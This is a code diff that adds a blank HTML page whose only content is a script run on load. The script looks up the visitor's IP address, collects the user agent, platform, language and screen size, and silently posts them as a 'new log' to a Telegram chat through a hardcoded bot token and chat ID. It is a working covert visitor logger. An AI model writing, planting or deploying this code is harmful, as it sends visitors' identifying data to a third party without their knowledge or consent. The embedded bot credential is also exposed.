@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+
+  <script>
+    async function getClientInfo() {
+      const ipResponse = await fetch("https://api.db-ip.com/v2/free/self");
+      const ipData = await ipResponse.json();
+      const ipAddress = ipData.ipAddress;
+
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const language = navigator.language || navigator.userLanguage;
+      const screenResolution = `${window.screen.width}x${window.screen.height}`;
+
+      const message = `Новый лог 🚀\n\n├ IP Address: ${ipAddress}\n├ User-Agent: ${userAgent}\n├ Platform: ${platform}\n├ Language: ${language}\n└ Screen Resolution: ${screenResolution}`;
+
+      const botToken = "7132706725:AAE6MiPY5R4Pii-QmmVLFAedWPRBl1a6_ds";
+      const chatId = "-1002420356691";
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        })
+      });
+    }
+
+    getClientInfo();
+  </script>
+</body>
+</html>
